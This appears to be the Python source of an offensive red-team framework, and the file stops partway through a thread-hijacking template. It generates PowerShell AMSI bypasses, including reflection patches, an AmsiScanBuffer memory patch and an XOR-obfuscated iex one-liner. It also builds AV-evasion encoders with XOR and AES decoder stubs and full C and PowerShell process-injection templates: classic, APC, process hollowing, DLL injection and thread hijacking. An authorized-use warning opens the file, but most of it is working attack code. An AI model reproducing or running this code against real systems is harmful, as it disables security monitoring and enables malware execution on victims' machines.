#!/usr/bin/env python3
"""
Ghost Framework — Evasion & Payload Crafting Framework
Covers AMSI bypass, AV evasion encoding, process injection templates,
LOLBaS command generation, shellcode staging, and EDR fingerprinting.

MITRE ATT&CK: T1055, T1027, T1218, T1562, T1497, T1106
Tactics: TA0005 (Defense Evasion), TA0002 (Execution)
"""

import argparse
import base64
import hashlib
import json
import math
import os
import random
import secrets
import string
import struct
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import List, Optional

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.text import Text
    from rich import box
except ImportError:
    print("[!] Missing dependency: rich. Install with: pip install rich")
    sys.exit(1)

try:
    import pyfiglet
except ImportError:
    print("[!] Missing dependency: pyfiglet. Install with: pip install pyfiglet")
    sys.exit(1)

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    print("[!] Missing dependency: pycryptodome. Install with: pip install pycryptodome")
    sys.exit(1)

TOOL_NAME = "Ghost Framework"
COMMAND = "ghost"
VERSION = "1.0.0"

console = Console()

LEGAL_WARNING = """
[bold red]WARNING — AUTHORIZED USE ONLY[/bold red]

Ghost Framework is a professional red team and penetration testing tool.
Unauthorized access to computer systems is illegal under:
  - Computer Fraud and Abuse Act (CFAA) — 18 U.S.C. § 1030
  - Computer Misuse Act 1990 (UK)
  - Applicable local cybercrime legislation

You MUST have explicit written authorization before using this tool
against any target. The author assumes no liability for misuse.

Proceed only if you have a signed Rules of Engagement (RoE) document.
"""


# ──────────────────────────────── Data Classes ──────────────────────────────── #

@dataclass
class AttackResult:
    module: str
    action: str
    status: str          # ok, fail, critical
    severity: str        # info, low, medium, high, critical
    notes: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class EngagementContext:
    payload_type: str = "staged"
    target_os: str = "windows"
    arch: str = "x64"
    output_dir: str = "./ghost_output"
    lhost: str = "0.0.0.0"
    lport: int = 4444
    encoding_iterations: int = 3
    results: List[AttackResult] = field(default_factory=list)
    output_file: Optional[str] = None


# ──────────────────────────────── Helpers ──────────────────────────────── #

def _info(msg: str):
    console.print(f"  [bold cyan][INFO][/bold cyan]  {msg}")

def _ok(msg: str):
    console.print(f"  [bold green][ OK ][/bold green]  {msg}")

def _warn(msg: str):
    console.print(f"  [bold yellow][WARN][/bold yellow]  {msg}")

def _crit(msg: str):
    console.print(f"  [bold red][CRIT][/bold red]  {msg}")

def _section(title: str):
    console.print()
    console.print(Panel(f"[bold white]{title}[/bold white]", border_style="bright_blue", width=72))

def _rand_var(length: int = 8) -> str:
    return ''.join(random.choices(string.ascii_lowercase, k=1)) + \
           ''.join(random.choices(string.ascii_lowercase + string.digits, k=length - 1))

def _xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def _calc_entropy(data: bytes) -> float:
    if not data:
        return 0.0
    freq = {}
    for b in data:
        freq[b] = freq.get(b, 0) + 1
    length = len(data)
    entropy = 0.0
    for count in freq.values():
        p = count / length
        if p > 0:
            entropy -= p * math.log2(p)
    return entropy

def _save_artifact(ctx: EngagementContext, filename: str, content: str) -> str:
    os.makedirs(ctx.output_dir, exist_ok=True)
    path = os.path.join(ctx.output_dir, filename)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    return path


# ──────────────────────────── Module 1: AMSI Bypass ──────────────────────────── #

class AMSIBypassModule:
    """Generate AMSI bypass techniques for PowerShell environments.
    Maps to MITRE T1562.001 — Impair Defenses: Disable or Modify Tools.
    """

    NAME = "AMSI Bypass Generator"

    def run(self, ctx: EngagementContext):
        _section("Module 1 — AMSI Bypass Generator [T1562.001]")

        if ctx.target_os != "windows":
            _warn("AMSI is Windows-specific — skipping on non-Windows target")
            ctx.results.append(AttackResult(
                module="amsi", action="skip", status="ok",
                severity="info", notes="AMSI not applicable on non-Windows target"
            ))
            return

        bypasses = []

        # ── Technique 1: amsiInitFailed Patch ──
        _info("Generating amsiInitFailed patch variant...")
        obf_amsi_utils = self._obfuscate_string("AmsiUtils")
        obf_init_failed = self._obfuscate_string("amsiInitFailed")
        patch1 = (
            f"$a=[Ref].Assembly.GetType('System.Management.Automation.'+{obf_amsi_utils});\n"
            f"$f=$a.GetField({obf_init_failed},'NonPublic,Static');\n"
            f"$f.SetValue($null,$true)"
        )
        bypasses.append({
            "name": "amsiInitFailed Patch",
            "technique": "Set amsiInitFailed field to True via reflection",
            "code": patch1,
            "detection_risk": "medium",
            "notes": "Widely signatured — string obfuscation required"
        })
        _ok("amsiInitFailed patch generated (detection risk: MEDIUM)")

        # ── Technique 2: AmsiScanBuffer Memory Patch ──
        _info("Generating AmsiScanBuffer memory patch...")
        patch2 = (
            "$w = [System.Runtime.InteropServices.Marshal]\n"
            "$p = [System.Runtime.InteropServices.RuntimeEnvironment]\n"
            "$a = [Ref].Assembly.GetTypes() | ? {$_.Name -like '*siUtils'}\n"
            "$m = $a.GetMethods('NonPublic,Static') | ? {$_.Name -like 'Sc*ffer'}\n"
            "$b = 0\n"
            "[Runtime.InteropServices.Marshal]::WriteInt32([IntPtr]($m.MethodHandle."
            "GetFunctionPointer().ToInt64()+65), 0x80070057)"
        )
        bypasses.append({
            "name": "AmsiScanBuffer Patch",
            "technique": "Overwrite AmsiScanBuffer return value to force AMSI_RESULT_CLEAN",
            "code": patch2,
            "detection_risk": "high",
            "notes": "Modifies memory — triggers kernel callbacks on modern EDRs"
        })
        _ok("AmsiScanBuffer patch generated (detection risk: HIGH)")

        # ── Technique 3: Reflection-based Context Nulling ──
        _info("Generating reflection-based amsiContext null...")
        patch3 = (
            "$t=[Ref].Assembly.GetType(('System.Management.Automation.Am'+'siUt'+'ils'));\n"
            "$c=$t.GetField(('am'+'siCo'+'ntext'),[Reflection.BindingFlags]'NonPublic,Static');\n"
            "$c.SetValue($null,[IntPtr]::Zero)"
        )
        bypasses.append({
            "name": "Reflection Context Null",
            "technique": "Null the amsiContext pointer via reflection — scans return clean",
            "code": patch3,
            "detection_risk": "medium",
            "notes": "Effective on PS 5.1, partial coverage on PS 7+"
        })
        _ok("Reflection context null generated (detection risk: MEDIUM)")

        # ── Technique 4: CLM Bypass via Runspace ──
        _info("Generating CLM bypass via custom runspace...")
        patch4 = (
            "$rs = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()\n"
            "$rs.ApartmentState = 'STA'\n"
            "$rs.ThreadOptions = 'ReuseThread'\n"
            "$rs.Open()\n"
            "$ps = [PowerShell]::Create()\n"
            "$ps.Runspace = $rs\n"
            "$ps.AddScript('$ExecutionContext.SessionState.LanguageMode').Invoke()"
        )
        bypasses.append({
            "name": "CLM Bypass (Runspace)",
            "technique": "Create new runspace to escape Constrained Language Mode",
            "code": patch4,
            "detection_risk": "low",
            "notes": "Works when AppLocker enforces CLM but doesn't restrict runspace creation"
        })
        _ok("CLM bypass generated (detection risk: LOW)")

        # ── Technique 5: XOR-obfuscated one-liner ──
        _info("Generating XOR-obfuscated bypass one-liner...")
        xor_key = secrets.randbelow(200) + 50
        raw = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
        enc = ','.join([str(ord(c) ^ xor_key) for c in raw])
        patch5 = (
            f"$k={xor_key};$e=@({enc});"
            "$d=$e|%{[char]($_ -bxor $k)};iex(-join $d)"
        )
        bypasses.append({
            "name": "XOR Obfuscated One-Liner",
            "technique": f"XOR encode full bypass with key 0x{xor_key:02X}, decode at runtime",
            "code": patch5,
            "detection_risk": "low",
            "notes": "Evades static string signatures — runtime behavior still detectable"
        })
        _ok(f"XOR one-liner generated (key=0x{xor_key:02X}, detection risk: LOW)")

        # ── Test payload ──
        _info("Generating AMSI test payload (EICAR-style)...")
        test_payload = "Invoke-Expression 'amsiutils'"  # harmless trigger string
        bypasses.append({
            "name": "AMSI Test Payload",
            "technique": "Harmless string that triggers AMSI — use after bypass to verify",
            "code": test_payload,
            "detection_risk": "info",
            "notes": "If this executes without AMSI alert, bypass is active"
        })
        _ok("Test payload generated")

        # ── Summary table ──
        table = Table(title="AMSI Bypass Variants", box=box.ROUNDED)
        table.add_column("Technique", style="cyan")
        table.add_column("Detection Risk", justify="center")
        table.add_column("Target")
        for bp in bypasses:
            risk_color = {"low": "green", "medium": "yellow", "high": "red", "info": "dim"}.get(
                bp["detection_risk"], "white")
            table.add_row(
                bp["name"],
                f"[{risk_color}]{bp['detection_risk'].upper()}[/{risk_color}]",
                bp["notes"][:60]
            )
        console.print(table)

        # ── Save artifacts ──
        artifact = "\n\n".join([
            f"# --- {bp['name']} ---\n# {bp['technique']}\n# Detection Risk: "
            f"{bp['detection_risk'].upper()}\n\n{bp['code']}"
            for bp in bypasses
        ])
        path = _save_artifact(ctx, "amsi_bypasses.ps1", artifact)
        _ok(f"All AMSI bypasses saved to {path}")

        ctx.results.append(AttackResult(
            module="amsi", action="generate_bypasses", status="ok",
            severity="high", notes=f"Generated {len(bypasses)} AMSI bypass variants"
        ))

    @staticmethod
    def _obfuscate_string(s: str) -> str:
        parts = []
        i = 0
        while i < len(s):
            chunk_len = random.randint(2, 4)
            parts.append(f"'{s[i:i+chunk_len]}'")
            i += chunk_len
        return '(' + '+'.join(parts) + ')'


# ──────────────────────────── Module 2: AV Evasion ──────────────────────────── #

class AVEvasionModule:
    """AV evasion through encoding, encryption, and obfuscation.
    Maps to MITRE T1027 — Obfuscated Files or Information.
    """

    NAME = "AV Evasion Encoder"

    def run(self, ctx: EngagementContext):
        _section("Module 2 — AV Evasion Encoder [T1027]")

        sample_payload = b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
        techniques_generated = 0

        # ── XOR Encoding (single-byte and multi-byte) ──
        _info("Generating XOR-encoded variants...")
        single_key = secrets.token_bytes(1)
        multi_key = secrets.token_bytes(random.randint(4, 16))
        xor_single = _xor_bytes(sample_payload, single_key)
        xor_multi = _xor_bytes(sample_payload, multi_key)

        xor_ps_stub = self._gen_xor_decoder_ps(single_key)
        xor_c_stub = self._gen_xor_decoder_c(multi_key)
        xor_cs_stub = self._gen_xor_decoder_csharp(multi_key)
        xor_py_stub = self._gen_xor_decoder_python(multi_key)

        _ok(f"XOR single-byte (key=0x{single_key.hex()}) — {len(xor_single)} bytes")
        _ok(f"XOR multi-byte (key={multi_key.hex()}, len={len(multi_key)}) — {len(xor_multi)} bytes")
        techniques_generated += 2

        # ── AES-256-CBC Encryption ──
        _info("Generating AES-256-CBC encrypted payload...")
        aes_key = secrets.token_bytes(32)
        aes_iv = secrets.token_bytes(16)
        cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
        aes_encrypted = cipher.encrypt(pad(sample_payload, AES.block_size))

        aes_stub = self._gen_aes_decrypt_stub(aes_key, aes_iv)
        _ok(f"AES-256-CBC encrypted — key={aes_key[:8].hex()}... iv={aes_iv[:4].hex()}...")
        techniques_generated += 1

        # ── Base64 Multi-layer Encoding ──
        _info("Generating multi-layer Base64 encoding...")
        encoded = sample_payload
        layers = ctx.encoding_iterations
        for _ in range(layers):
            encoded = base64.b64encode(encoded)
        _ok(f"Base64 x{layers} — output size {len(encoded)} bytes")
        techniques_generated += 1

        # ── String Reversal ──
        _info("Generating string reversal variant...")
        reversed_hex = sample_payload.hex()[::-1]
        _ok(f"Reversed hex string — {len(reversed_hex)} chars (reconstruct at runtime)")
        techniques_generated += 1

        # ── Variable Name Randomization ──
        _info("Generating randomized variable names...")
        var_names = [_rand_var(random.randint(6, 14)) for _ in range(10)]
        _ok(f"Generated {len(var_names)} random identifiers: {', '.join(var_names[:4])}...")
        techniques_generated += 1

        # ── Dead Code Insertion ──
        _info("Generating dead code blocks...")
        dead_code = self._generate_dead_code(6)
        _ok(f"Generated {len(dead_code)} dead code blocks for insertion")
        techniques_generated += 1

        # ── Control Flow Obfuscation ──
        _info("Generating control flow obfuscation...")
        opaque = self._generate_opaque_predicates(4)
        _ok(f"Generated {len(opaque)} opaque predicates for control flow flattening")
        techniques_generated += 1

        # ── Entropy Analysis ──
        _info("Running entropy analysis on encoded outputs...")
        entropy_raw = _calc_entropy(sample_payload)
        entropy_xor = _calc_entropy(xor_multi)
        entropy_aes = _calc_entropy(aes_encrypted)
        entropy_b64 = _calc_entropy(encoded)

        table = Table(title="Entropy Analysis", box=box.ROUNDED)
        table.add_column("Variant", style="cyan")
        table.add_column("Entropy (bits)", justify="right")
        table.add_column("Detection Risk", justify="center")

        for label, ent in [("Raw payload", entropy_raw), ("XOR multi-byte", entropy_xor),
                           ("AES-256-CBC", entropy_aes), (f"Base64 x{layers}", entropy_b64)]:
            risk = "HIGH" if ent > 7.5 else ("MEDIUM" if ent > 6.0 else "LOW")
            color = {"HIGH": "red", "MEDIUM": "yellow", "LOW": "green"}[risk]
            table.add_row(label, f"{ent:.4f}", f"[{color}]{risk}[/{color}]")

        console.print(table)

        if entropy_aes > 7.5:
            _warn("AES output entropy > 7.5 — heuristic engines may flag as packed/encrypted")

        # ── Save decoder stubs ──
        all_stubs = {
            "xor_decoder.ps1": xor_ps_stub,
            "xor_decoder.c": xor_c_stub,
            "xor_decoder.cs": xor_cs_stub,
            "xor_decoder.py": xor_py_stub,
            "aes_decrypt_stub.cs": aes_stub,
        }
        for fname, content in all_stubs.items():
            path = _save_artifact(ctx, fname, content)
            _ok(f"Saved {fname} → {path}")

        ctx.results.append(AttackResult(
            module="av_evasion", action="encode_and_obfuscate", status="ok",
            severity="high", notes=f"Generated {techniques_generated} evasion techniques with decoder stubs"
        ))

    @staticmethod
    def _gen_xor_decoder_ps(key: bytes) -> str:
        return (
            f"# XOR Decoder — PowerShell\n"
            f"# Key: 0x{key.hex()}\n"
            f"$key = 0x{key.hex()}\n"
            f"$enc = [byte[]]@( <# INSERT XOR-ENCODED BYTES HERE #> )\n"
            f"$dec = @()\n"
            f"foreach ($b in $enc) {{ $dec += ($b -bxor $key) }}\n"
            f"$code = [System.Runtime.InteropServices.Marshal]::Copy($dec, 0, $addr, $dec.Length)\n"
        )

    @staticmethod
    def _gen_xor_decoder_c(key: bytes) -> str:
        key_arr = ', '.join([f'0x{b:02x}' for b in key])
        return (
            f"// XOR Decoder — C\n"
            f"// Multi-byte key, length {len(key)}\n"
            f"unsigned char key[] = {{ {key_arr} }};\n"
            f"unsigned char enc[] = {{ /* INSERT ENCODED BYTES */ }};\n"
            f"int key_len = sizeof(key);\n"
            f"int enc_len = sizeof(enc);\n\n"
            f"for (int i = 0; i < enc_len; i++) {{\n"
            f"    enc[i] ^= key[i % key_len];\n"
            f"}}\n"
        )

    @staticmethod
    def _gen_xor_decoder_csharp(key: bytes) -> str:
        key_arr = ', '.join([f'0x{b:02x}' for b in key])
        return (
            f"// XOR Decoder — C#\n"
            f"byte[] key = new byte[] {{ {key_arr} }};\n"
            f"byte[] enc = new byte[] {{ /* INSERT ENCODED BYTES */ }};\n\n"
            f"for (int i = 0; i < enc.Length; i++)\n"
            f"    enc[i] ^= key[i % key.Length];\n"
        )

    @staticmethod
    def _gen_xor_decoder_python(key: bytes) -> str:
        return (
            f"# XOR Decoder — Python\n"
            f"key = {list(key)}\n"
            f"enc = bytearray(b'')  # INSERT ENCODED BYTES\n\n"
            f"dec = bytearray(len(enc))\n"
            f"for i in range(len(enc)):\n"
            f"    dec[i] = enc[i] ^ key[i % len(key)]\n"
        )

    @staticmethod
    def _gen_aes_decrypt_stub(key: bytes, iv: bytes) -> str:
        return (
            f"// AES-256-CBC Decryption Stub — C#\n"
            f"// Key: {key.hex()}\n"
            f"// IV:  {iv.hex()}\n\n"
            f"using System.Security.Cryptography;\n\n"
            f"byte[] key = Convert.FromBase64String(\"{base64.b64encode(key).decode()}\");\n"
            f"byte[] iv  = Convert.FromBase64String(\"{base64.b64encode(iv).decode()}\");\n"
            f"byte[] enc = Convert.FromBase64String(\"<INSERT_B64_PAYLOAD>\");\n\n"
            f"using (Aes aes = Aes.Create())\n"
            f"{{\n"
            f"    aes.Key = key;\n"
            f"    aes.IV = iv;\n"
            f"    aes.Mode = CipherMode.CBC;\n"
            f"    aes.Padding = PaddingMode.PKCS7;\n"
            f"    ICryptoTransform decryptor = aes.CreateDecryptor();\n"
            f"    byte[] dec = decryptor.TransformFinalBlock(enc, 0, enc.Length);\n"
            f"}}\n"
        )

    @staticmethod
    def _generate_dead_code(count: int) -> list:
        blocks = []
        for _ in range(count):
            v1, v2 = _rand_var(), _rand_var()
            op = random.choice(['+', '-', '*', '^'])
            val = random.randint(1, 99999)
            blocks.append(f"int {v1} = {val}; int {v2} = {v1} {op} {random.randint(1,999)};")
        return blocks

    @staticmethod
    def _generate_opaque_predicates(count: int) -> list:
        predicates = []
        for _ in range(count):
            x = _rand_var()
            predicates.append(f"int {x} = 7; if (({x} * {x} - 49) == 0) {{ /* always true */ }}")
        return predicates


# ──────────────────────────── Module 3: Process Injection ──────────────────────────── #

class ProcessInjectionModule:
    """Process injection technique templates.
    Maps to MITRE T1055 — Process Injection.
    """

    NAME = "Process Injection Templates"

    TECHNIQUES = {
        "classic": {
            "name": "Classic DLL/Shellcode Injection",
            "mitre": "T1055.001 / T1055.003",
            "apis": ["OpenProcess", "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"],
            "edr_hooks": ["ntdll!NtWriteVirtualMemory", "ntdll!NtCreateThreadEx",
                          "kernel32!CreateRemoteThread", "ntdll!NtAllocateVirtualMemory"],
            "detection": "High — every major EDR hooks these APIs in userland ntdll"
        },
        "apc": {
            "name": "APC Injection",
            "mitre": "T1055.004",
            "apis": ["OpenProcess", "VirtualAllocEx", "WriteProcessMemory",
                     "OpenThread", "QueueUserAPC"],
            "edr_hooks": ["ntdll!NtQueueApcThread", "ntdll!NtWriteVirtualMemory"],
            "detection": "Medium — requires alertable thread state, less commonly monitored"
        },
        "hollowing": {
            "name": "Process Hollowing",
            "mitre": "T1055.012",
            "apis": ["CreateProcess (SUSPENDED)", "NtUnmapViewOfSection",
                     "VirtualAllocEx", "WriteProcessMemory", "SetThreadContext", "ResumeThread"],
            "edr_hooks": ["ntdll!NtUnmapViewOfSection", "ntdll!NtSetContextThread",
                          "ntdll!NtResumeThread"],
            "detection": "High — suspended process creation is a strong signal"
        },
        "dll_inject": {
            "name": "DLL Injection via LoadLibrary",
            "mitre": "T1055.001",
            "apis": ["OpenProcess", "VirtualAllocEx", "WriteProcessMemory",
                     "GetProcAddress(LoadLibraryA)", "CreateRemoteThread"],
            "edr_hooks": ["ntdll!LdrLoadDll", "kernel32!CreateRemoteThread"],
            "detection": "High — LoadLibrary from remote thread is a classic indicator"
        },
        "thread_hijack": {
            "name": "Thread Hijacking",
            "mitre": "T1055.003",
            "apis": ["OpenThread", "SuspendThread", "GetThreadContext",
                     "SetThreadContext (RIP/EIP)", "ResumeThread"],
            "edr_hooks": ["ntdll!NtSetContextThread", "ntdll!NtSuspendThread",
                          "ntdll!NtGetContextThread"],
            "detection": "Medium — no new thread created, but context modification is flagged"
        },
    }

    def run(self, ctx: EngagementContext):
        _section("Module 3 — Process Injection Templates [T1055]")

        # ── Summary table ──
        table = Table(title="Process Injection Techniques", box=box.ROUNDED)
        table.add_column("Technique", style="cyan")
        table.add_column("MITRE", style="dim")
        table.add_column("API Count", justify="center")
        table.add_column("Detection Surface")

        for key, tech in self.TECHNIQUES.items():
            table.add_row(
                tech["name"],
                tech["mitre"],
                str(len(tech["apis"])),
                tech["detection"]
            )
        console.print(table)

        # ── Generate templates ──
        for key, tech in self.TECHNIQUES.items():
            _info(f"Generating {tech['name']} template...")

            if key == "classic":
                c_code = self._classic_inject_c(ctx)
                ps_code = self._classic_inject_ps(ctx)
                _save_artifact(ctx, "inject_classic.c", c_code)
                _save_artifact(ctx, "inject_classic.ps1", ps_code)

            elif key == "apc":
                c_code = self._apc_inject_c(ctx)
                _save_artifact(ctx, "inject_apc.c", c_code)

            elif key == "hollowing":
                c_code = self._process_hollowing_c(ctx)
                _save_artifact(ctx, "inject_hollowing.c", c_code)

            elif key == "dll_inject":
                c_code = self._dll_inject_c(ctx)
                _save_artifact(ctx, "inject_dll.c", c_code)

            elif key == "thread_hijack":
                c_code = self._thread_hijack_c(ctx)
                _save_artifact(ctx, "inject_thread_hijack.c", c_code)

            _ok(f"{tech['name']} — template generated")

            # ── EDR hook analysis ──
            hooks_str = ", ".join(tech["edr_hooks"])
            _warn(f"EDR hooks on: {hooks_str}")

        ctx.results.append(AttackResult(
            module="process_injection", action="generate_templates", status="ok",
            severity="critical",
            notes=f"Generated {len(self.TECHNIQUES)} injection technique templates with EDR hook analysis"
        ))

    @staticmethod
    def _classic_inject_c(ctx: EngagementContext) -> str:
        return (
            "// Classic Shellcode Injection — C\n"
            "// T1055.003 — OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread\n\n"
            "#include <windows.h>\n#include <stdio.h>\n\n"
            "unsigned char shellcode[] = { /* INSERT SHELLCODE */ };\n\n"
            "int main(int argc, char* argv[]) {\n"
            "    DWORD pid = atoi(argv[1]);\n"
            "    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n"
            "    if (!hProcess) { printf(\"[-] OpenProcess failed\\n\"); return 1; }\n\n"
            "    LPVOID addr = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),\n"
            "                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n"
            "    if (!addr) { printf(\"[-] VirtualAllocEx failed\\n\"); return 1; }\n\n"
            "    WriteProcessMemory(hProcess, addr, shellcode, sizeof(shellcode), NULL);\n\n"
            "    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,\n"
            "                                        (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);\n"
            "    WaitForSingleObject(hThread, INFINITE);\n"
            "    CloseHandle(hThread);\n"
            "    CloseHandle(hProcess);\n"
            "    return 0;\n}\n"
        )

    @staticmethod
    def _classic_inject_ps(ctx: EngagementContext) -> str:
        return (
            "# Classic Shellcode Injection — PowerShell\n"
            "# Uses Add-Type to call Win32 APIs\n\n"
            "$code = @\"\n"
            "using System;\nusing System.Runtime.InteropServices;\n"
            "public class Win32 {\n"
            "    [DllImport(\"kernel32.dll\")] public static extern IntPtr OpenProcess(int a, bool b, int c);\n"
            "    [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAllocEx(IntPtr a, IntPtr b, uint c, uint d, uint e);\n"
            "    [DllImport(\"kernel32.dll\")] public static extern bool WriteProcessMemory(IntPtr a, IntPtr b, byte[] c, int d, out int e);\n"
            "    [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateRemoteThread(IntPtr a, IntPtr b, uint c, IntPtr d, IntPtr e, uint f, out IntPtr g);\n"
            "}\n\"@\n\n"
            "Add-Type $code\n"
            "$pid = <TARGET_PID>\n"
            "[byte[]]$sc = <SHELLCODE_BYTES>\n"
            "$h = [Win32]::OpenProcess(0x001F0FFF, $false, $pid)\n"
            "$a = [Win32]::VirtualAllocEx($h, [IntPtr]::Zero, [uint32]$sc.Length, 0x3000, 0x40)\n"
            "$o = 0\n"
            "[Win32]::WriteProcessMemory($h, $a, $sc, $sc.Length, [ref]$o)\n"
            "$t = [IntPtr]::Zero\n"
            "[Win32]::CreateRemoteThread($h, [IntPtr]::Zero, 0, $a, [IntPtr]::Zero, 0, [ref]$t)\n"
        )

    @staticmethod
    def _apc_inject_c(ctx: EngagementContext) -> str:
        return (
            "// APC Injection — C\n"
            "// T1055.004 — QueueUserAPC to alertable thread\n\n"
            "#include <windows.h>\n#include <tlhelp32.h>\n\n"
            "unsigned char shellcode[] = { /* INSERT SHELLCODE */ };\n\n"
            "DWORD FindAlertableThread(DWORD pid) {\n"
            "    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\n"
            "    THREADENTRY32 te = { sizeof(THREADENTRY32) };\n"
            "    if (Thread32First(snap, &te)) {\n"
            "        do {\n"
            "            if (te.th32OwnerProcessID == pid) {\n"
            "                CloseHandle(snap);\n"
            "                return te.th32ThreadID;\n"
            "            }\n"
            "        } while (Thread32Next(snap, &te));\n"
            "    }\n"
            "    CloseHandle(snap);\n"
            "    return 0;\n}\n\n"
            "int main(int argc, char* argv[]) {\n"
            "    DWORD pid = atoi(argv[1]);\n"
            "    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n"
            "    LPVOID addr = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),\n"
            "                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n"
            "    WriteProcessMemory(hProcess, addr, shellcode, sizeof(shellcode), NULL);\n\n"
            "    DWORD tid = FindAlertableThread(pid);\n"
            "    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);\n"
            "    QueueUserAPC((PAPCFUNC)addr, hThread, 0);\n"
            "    CloseHandle(hThread);\n"
            "    CloseHandle(hProcess);\n"
            "    return 0;\n}\n"
        )

    @staticmethod
    def _process_hollowing_c(ctx: EngagementContext) -> str:
        return (
            "// Process Hollowing — C\n"
            "// T1055.012 — CreateProcess(SUSPENDED) → NtUnmapViewOfSection → Write → Resume\n\n"
            "#include <windows.h>\n#include <winternl.h>\n\n"
            "typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);\n\n"
            "unsigned char payload[] = { /* INSERT PE PAYLOAD */ };\n\n"
            "int main() {\n"
            "    STARTUPINFOA si = { sizeof(si) };\n"
            "    PROCESS_INFORMATION pi;\n\n"
            "    // Create suspended process\n"
            "    CreateProcessA(\"C:\\\\Windows\\\\System32\\\\svchost.exe\", NULL, NULL, NULL,\n"
            "                   FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);\n\n"
            "    // Unmap original image\n"
            "    pNtUnmapViewOfSection NtUnmap = (pNtUnmapViewOfSection)\n"
            "        GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtUnmapViewOfSection\");\n"
            "    // Get PEB → ImageBaseAddress\n"
            "    CONTEXT ctx;\n"
            "    ctx.ContextFlags = CONTEXT_FULL;\n"
            "    GetThreadContext(pi.hThread, &ctx);\n\n"
            "    LPVOID imageBase;\n"
            "#ifdef _WIN64\n"
            "    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &imageBase, sizeof(LPVOID), NULL);\n"
            "#else\n"
            "    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x8), &imageBase, sizeof(LPVOID), NULL);\n"
            "#endif\n"
            "    NtUnmap(pi.hProcess, imageBase);\n\n"
            "    // Write payload and resume\n"
            "    LPVOID addr = VirtualAllocEx(pi.hProcess, imageBase, sizeof(payload),\n"
            "                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n"
            "    WriteProcessMemory(pi.hProcess, addr, payload, sizeof(payload), NULL);\n"
            "    ResumeThread(pi.hThread);\n\n"
            "    CloseHandle(pi.hThread);\n"
            "    CloseHandle(pi.hProcess);\n"
            "    return 0;\n}\n"
        )

    @staticmethod
    def _dll_inject_c(ctx: EngagementContext) -> str:
        return (
            "// DLL Injection via LoadLibrary — C\n"
            "// T1055.001 — Write DLL path → CreateRemoteThread(LoadLibraryA)\n\n"
            "#include <windows.h>\n#include <stdio.h>\n\n"
            "int main(int argc, char* argv[]) {\n"
            "    DWORD pid = atoi(argv[1]);\n"
            "    const char* dllPath = argv[2];  // Full path to malicious DLL\n\n"
            "    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n"
            "    LPVOID addr = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1,\n"
            "                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
            "    WriteProcessMemory(hProcess, addr, dllPath, strlen(dllPath) + 1, NULL);\n\n"
            "    HMODULE hKernel = GetModuleHandleA(\"kernel32.dll\");\n"
            "    FARPROC pLoadLib = GetProcAddress(hKernel, \"LoadLibraryA\");\n\n"
            "    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,\n"
            "                                        (LPTHREAD_START_ROUTINE)pLoadLib, addr, 0, NULL);\n"
            "    WaitForSingleObject(hThread, INFINITE);\n"
            "    CloseHandle(hThread);\n"
            "    CloseHandle(hProcess);\n"
            "    return 0;\n}\n"
        )

    @staticmethod
    def _thread_hijack_c(ctx: EngagementContext) -> str:
        return (
            "// Thread Hijacking — C\n"
            "// T1055.003 — SuspendThread → modify RIP/EIP → ResumeThread\n\n"
            "#include <windows.h>\n#include <tlhelp32.h>\n\n"
            "unsigned char shellcode[] = { /* INSERT SHELLCODE */ };\n\n"
            "int main(int argc, char* argv[]) {\n"
            "    DWORD pid = atoi(argv[1]);\n"
            "    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n\n"
            "    // Allocate and write shellcode\n"
            "    LPVOID addr = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),\n"
            "                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n"
            "    WriteProcessMemory(hProcess, addr, shellcode, sizeof(shellcode), NULL);\n\n"
            "    // Find and suspend target thread\n"
            "    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\n"
            "    THREADENTRY32 te = { sizeof(THREADENTRY32) };\n"
            "    HANDLE hThread = NULL;\n"
            "    if (Thread32First(snap, &te)) {\n"
            "        do {\n"
            "            if (te.th32OwnerProcessID == pid) {\n"
            "                hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);\n"
            "                break;\n"
            "            }\n"
            "        } while (Thread32Next(snap, &te));\n"
            "    }\n"
